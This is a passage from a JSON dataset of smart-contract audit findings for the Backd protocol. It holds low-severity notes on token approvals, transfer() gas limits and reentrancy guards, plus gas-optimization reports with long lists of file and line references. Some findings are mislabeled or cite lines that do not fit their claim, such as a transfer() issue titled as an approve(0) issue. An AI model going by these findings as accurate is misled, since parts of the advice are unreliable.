IERC20(USDC).safeApprove(SUSHISWAP, type(uint256).max);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/swappers/Swapper3Crv.sol::45 => IERC20(USDT).safeApprove(SUSHISWAP, type(uint256).max);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/swappers/Swapper3Crv.sol::47 => IERC20(DAI).safeApprove(UNISWAP, type(uint256).max);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/swappers/Swapper3Crv.sol::48 => IERC20(USDC).safeApprove(UNISWAP, type(uint256).max);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/swappers/Swapper3Crv.sol::49 => IERC20(USDT).safeApprove(UNISWAP, type(uint256).max);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/AmmConvexGauge.sol::62 => IERC20(ammToken).safeApprove(booster, type(uint256).max);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Erc20Vault.sol::21 => IERC20(underlying_).safeApprove(address(reserve), type(uint256).max);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Erc20Vault.sol::22 => IERC20(underlying_).safeApprove(_pool, type(uint256).max);\n\n```\n2.  When trying to re-approve an already approved token, all transactions revert and the protocol cannot be used.\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nApprove with a zero amount first before setting the actual amount. Consider use safeIncreaseAllowance and safeDecreaseAllowance.\n\n\n# C4-0012 : The Contract Should approve(0) first\n\n\n## Description\nThe transfer() and send() functions forward a fixed amount of 2300 gas. Historically, it has often been recommended to use these functions for value transfers to guard against reentrancy attacks. However, the gas cost of EVM instructions may change significantly during hard forks which may break already deployed contract systems that make fixed assumptions about gas costs. For example. EIP 1884 broke several existing smart contracts due to a cost increase of the SLOAD instruction.\n\n\n## Proof of Concept\n\n1. Navigate to the following contracts.\n\n```\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/EthPool.sol::30 => to.transfer(amount);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdEthCvx.sol::77 => payable(vault).transfer(amount);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdEthCvx.sol::93 => payable(vault).transfer(amount);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdEthCvx.sol::117 => payable(vault).transfer(underlyingBalance);\n```\n\n## Remediation\nAvoid the use of transfer() and send() and do not otherwise specify a fixed amount of gas when performing calls. Use .call.value(...)(\"\") instead. Use the checks-effects-interactions pattern and/or reentrancy locks to prevent reentrancy attacks.\n\n# C4-0013 : # Missing Re-entrancy Guard\n\n## Impact - LOW\n\nThe re-entrancy guard is missing on the some of the functions. The external interactions can cause to the re-entrancy vulnerability.\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n```\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdEthCvx.sol#L18\n\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L118\n\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L669\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nFollow the check effect interaction pattern or put re-entrancy guard.",
    "dataSource": {
      "name": "code-423n4/2022-04-backd-findings",
      "repo": "https://github.com/code-423n4/2022-04-backd-findings",
      "url": "https://github.com/code-423n4/2022-04-backd-findings/issues/198"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "# C4-001: Revert String Size Optimization\n\n## Impact\n\nShortening revert strings to fit in 32 bytes will decrease deploy time gas and will decrease runtime gas when the revert condition has been met.\n\nRevert strings that are longer than 32 bytes require at least one additional mstore, along with additional overhead for computing memory offset, etc.\n\n\n## Proof of Concept\n\nRevert strings > 32 bytes are here:\n\n```\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/libraries/EnumerableMapping.sol#L104\n```\n\n## Tools Used\n\nManual Review\n\n## Recommended Mitigation Steps\n\nShorten the revert strings to fit in 32 bytes. That will affect gas optimization.\n\n# C4-002 : Adding unchecked directive can save gas\n\n## Impact\n\nFor the arithmetic operations that will never over/underflow, using the unchecked directive (Solidity v0.8 has default overflow/underflow checks) can save some gas from the unnecessary internal over/underflow checks.\n\n## Proof of Concept\n\n```\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/BkdLocker.sol::133 => uint256 totalAvailableToWithdraw = 0;\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/BkdLocker.sol::310 => for (uint256 i = 0; i < length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/Controller.sol::114 => uint256 totalEthRequired = 0;\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/Controller.sol::117 => for (uint256 i = 0; i < numActions; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/StakerVault.sol::144 => uint256 startingAllowance = 0;\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/StakerVault.sol::260 => for (uint256 i = 0; i < actions.length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/access/RoleManager.sol::80 => for (uint256 i = 0; i < roles.length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::188 => for (uint256 i = 0; i < protocols.length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::452 => uint256 totalEthRequired = 0;\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::456 => for (uint256 i = 0; i < length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::479 => for (uint256 i = 0; i < length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::506 => for (uint256 i = 0; i < howMany; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::891 => for (uint256 i = 0; i < length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol::43 => for (uint256 i = 0; i < users.length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol::46 => for (uint256 j = 0; j < positions.length; j++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol::72 => for (uint256 i = 0; i < keys.length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol::93 => for (uint256 i = 0; i < length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol::165 => for (uint256 i = 0; i < length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CTokenRegistry.sol::61 => for (uint256 i = 0; i < ctokens.length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CompoundHandler.sol::135 => for (uint256 i = 0; i < assets.length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol::483 => uint256 currentFeeRatio = 0;\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol::313 => for (uint256 i = 0; i < _rewardTokens.length(); i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol::380 => for (uint256 i = 0; i < _rewardTokens.length(); i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/testing/MockStableSwap.sol::29 => uint256 total = 0;\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/testing/MockStableSwap.sol::30 => for (uint256 i = 0; i < 3; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/testing/MockStableSwap.sol::41 => uint256 total = 0;\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/testing/MockStableSwap.sol::42 => for (uint256 i = 0; i < 2; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/testing/MockStableSwap.sol::70 => for (uint256 i = 0; i < 3; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol::91 => for (uint256 i = 0; i < length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol::105 => for (uint256 i = 0; i < length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol::109 => for (uint256 i = 0; i < stakerVaults.length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol::114 => for (uint256 i = 0; i < length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol::166 => for (uint256 i = 0; i < length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol::191 => for (uint256 i = 0; i < length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol::259 => for (uint256 i = 0; i < length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol::283 => for (uint256 i = 0; i < length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol::357 => for (uint256 i = 0; i < length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol::381 => for (uint256 i = 0; i < length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol::403 => bool keeperGaugeExists = false;\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol::404 => for (uint256 i = 0; i < length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol::445 => for (uint256 i = 0; i < length; i++) {\n\n\n```\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nConsider applying unchecked arithmetic where overflow/underflow is not possible. Example can be seen from below.\n\n```\nUnchecked{i++};\n```\n\n# C4-003 : Cache array length in for loops can save gas\n\n\n## Impact\n\nReading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.\n\nCaching the array length in the stack saves around 3 gas per iteration.\n\n## Proof of Concept\n\n1. Navigate to the following smart contract line.\n\n```\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol::313 => for (uint256 i = 0; i < _rewardTokens.length(); i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol::380 => for (uint256 i = 0; i < _rewardTokens.length(); i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CTokenRegistry.sol::61 => for (uint256 i = 0; i < ctokens.length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CompoundHandler.sol::135 => for (uint256 i = 0; i < assets.length; i++) {\n```\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nConsider to cache array length.\n\n\n# C4-004 : Non-strict inequalities are cheaper than strict ones\n\n## Impact\n\nStrict inequalities add a check of non equality which costs around 3 gas.\n\n## Proof of Concept\n\n```\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/AddressProvider.sol::149 => return _vaults.length();\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/AddressProvider.sol::365 => return _tokenToPools.length();\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/BkdLocker.sol::135 => uint256 length = stashedWithdraws.length;\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/BkdLocker.sol::136 => require(length > 0, \"No entries\");\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/BkdLocker.sol::137 => uint256 i = length;\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/BkdLocker.sol::143 => stashedWithdraws[i] = stashedWithdraws[stashedWithdraws.length - 1];\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/BkdLocker.sol::309 => uint256 length = _replacedRewardTokens.length();\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/BkdLocker.sol::310 => for (uint256 i = 0; i < length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/Controller.sol::116 => uint256 numActions = actions.length;\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/StakerVault.sol::260 => for (uint256 i = 0; i < actions.length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/access/RoleManager.sol::80 => for (uint256 i = 0; i < roles.length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/access/RoleManager.sol::127 => return _roleMembers[role].length();\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::185 => require(protocols.length == handlers.length, Error.INVALID_ARGUMENT);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::188 => for (uint256 i = 0; i < protocols.length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::455 => uint256 length = userRecordsMeta.length;\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::456 => for (uint256 i = 0; i < length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::477 => uint256 length = _supportedProtocols.length();\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::478 => bytes32[] memory protocols = new bytes32[](length);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::479 => for (uint256 i = 0; i < length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::499 => uint256 length = _usersWithPositions.length();\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::500 => if (cursor >= length) return (new address[](0), 0);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::501 => if (howMany >= length - cursor) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::502 => howMany = length - cursor;\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::878 => if (_userPositions[payer].length == 0) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::890 => uint256 length = positionsMeta.length;\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::891 => for (uint256 i = 0; i < length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::894 => positionsMeta[i] = positionsMeta[length - 1];\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol::42 => if (users.length == 0) return (_shortenTopups(executableTopups, topupsAdded), 0);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol::43 => for (uint256 i = 0; i < users.length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol::46 => for (uint256 j = 0; j < positions.length; j++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol::51 => uint256 offset = j == positions.length - 1 ? 1 : 0;\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol::71 => bool[] memory results = new bool[](keys.length);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol::72 => for (uint256 i = 0; i < keys.length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol::91 => uint256 length = userRecordsMeta.length;\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol::92 => ITopUpAction.RecordWithMeta[] memory result = new ITopUpAction.RecordWithMeta[](length);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol::93 => for (uint256 i = 0; i < length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol::154 => * @dev Shortens a list of topups by truncating it to a given length.\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol::156 => * @param length The length to trucate the list of topups to.\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol::159 => function _shortenTopups(TopupData[] memory topups, uint256 length)\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol::164 => TopupData[] memory shortened = new TopupData[](length);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol::165 => for (uint256 i = 0; i < length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CTokenRegistry.sol::61 => for (uint256 i = 0; i < ctokens.length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CompoundHandler.sol::135 => for (uint256 i = 0; i < assets.length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol::313 => for (uint256 i = 0; i < _rewardTokens.length(); i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol::380 => for (uint256 i = 0; i < _rewardTokens.length(); i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol::90 => uint256 length = liquidityPools.length;\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol::91 => for (uint256 i = 0; i < length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol::104 => uint256 length = _keeperGauges.length();\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol::105 => for (uint256 i = 0; i < length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol::109 => for (uint256 i = 0; i < stakerVaults.length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol::113 => length = _ammGauges.length();\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol::114 => for (uint256 i = 0; i < length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol::163 => uint256 length = pools.length;\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol::164 => require(length == weights.length, Error.INVALID_ARGUMENT);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol::166 => for (uint256 i = 0; i < length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol::189 => uint256 length = pools.length;\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol::191 => for (uint256 i = 0; i < length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol::256 => uint256 length = lpTokens.length;\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol::257 => require(length == weights.length, \"Invalid length of arguments\");\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol::259 => for (uint256 i = 0; i < length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol::282 => uint256 length = lpTokens.length;\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol::283 => for (uint256 i = 0; i < length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol::354 => uint256 length = tokens.length;\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol::356 => require(length == weights.length, \"Invalid length of arguments\");\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol::357 => for (uint256 i = 0; i < length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol::377 => uint256 length = tokens.length;\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol::381 => for (uint256 i = 0; i < length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol::402 => uint256 length = _keeperGauges.length();\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol::404 => for (uint256 i = 0; i < length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol::411 => if (!keeperGaugeExists && weightBasedKeeperDistributionDeactivated && length >= 1) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol::444 => uint256 length = _ammGauges.length();\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol::445 => for (uint256 i = 0; i < length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/VestedEscrow.sol::93 => for (uint256 i = 0; i < amounts.length; i++) {\n\n\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nUse >= or <= instead of > and < when possible.\n\n# C4-005: Use of constant keccak variables results in extra hashing (and so gas).\n\n## Impact\n\nThat would Increase gas costs on all privileged operations.\n\n## Proof of Concept\n\nThe following role variables are marked as constant.\n\n```\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::943 => return keccak256(abi.encodePacked(_TOP_UP_HANDLER_KEY, protocol));\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpActionFeeHandler.sol::232 => return keccak256(abi.encodePacked(_KEEPER_GAUGE_KEY, lpToken));\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CTokenRegistry.sol::67 => keccak256(abi.encodePacked(ctoken.symbol())) == keccak256(abi.encodePacked(\"cETH\"))\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol::619 => return keccak256(abi.encodePacked(_KEEPER_WEIGHT_KEY, pool));\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol::623 => return keccak256(abi.encodePacked(_AMM_WEIGHT_KEY, token));\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol::627 => return keccak256(abi.encodePacked(_LP_WEIGHT_KEY, vault));\n```\n\nThis results in the keccak operation being performed whenever the variable is used, increasing gas costs relative to just storing the output hash. Changing to immutable will only perform hashing on contract deployment which will save gas.\n\nSee: ethereum/solidity#9232 (https://github.com/ethereum/solidity/issues/9232#issuecomment-646131646)\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nConsider to change the variable to be immutable rather than constant.\n\n# C4-006 : Check if amount > 0 before token transfer can save gas\n\n## Impact\n\nSince _amount can be 0. Checking if (_amount != 0) before the transfer can potentially save an external call and the unnecessary gas cost of a 0 token transfer.\n\n## Proof of Concept\n\n```\n 2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::62 => stakerVault.transferFrom(payer, address(this), amountLeft);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::291 => staker.transfer(payer, position.depositTokenBalance);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::692 => IStakerVault(vault).transfer(payer, position.depositTokenBalance);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CompoundHandler.sol::79 => bool success = ctoken.transfer(addr, mintedTokens);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/EthPool.sol::30 => to.transfer(amount);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdEthCvx.sol::77 => payable(vault).transfer(amount);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdEthCvx.sol::93 => payable(vault).transfer(amount);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdEthCvx.sol::117 => payable(vault).transfer(underlyingBalance);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/StrategySwapper.sol::63 => weth_.transferFrom(msg.sender, address(this), wethBalance_);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/swappers/Swapper3Crv.sol::62 => IERC20(fromToken).transferFrom(msg.sender, address(this), swapAmount);\n\n```\n\nAll Contracts\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nConsider checking amount != 0.\n\n# C4-007 : There is no need to assign default values to variables\n\n## Impact -  Gas Optimization\n\nWhen a variable is declared solidity assigns the default value. In case the contract assigns the value again, it costs extra gas.\n\nExample: uint x = 0 costs more gas than uint x without having any different functionality.\n\n## Proof of Concept\n\n```\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/BkdLocker.sol::310 => for (uint256 i = 0; i < length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/Controller.sol::116 => uint256 numActions = actions.length;\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/StakerVault.sol::260 => for (uint256 i = 0; i < actions.length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/access/RoleManager.sol::80 => for (uint256 i = 0; i < roles.length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/access/RoleManager.sol::127 => return _roleMembers[role].length();\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::185 => require(protocols.length == handlers.length, Error.INVALID_ARGUMENT);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::188 => for (uint256 i = 0; i < protocols.length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::455 => uint256 length = userRecordsMeta.length;\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::456 => for (uint256 i = 0; i < length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::477 => uint256 length = _supportedProtocols.length();\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::478 => bytes32[] memory protocols = new bytes32[](length);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::479 => for (uint256 i = 0; i < length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::499 => uint256 length = _usersWithPositions.length();\n  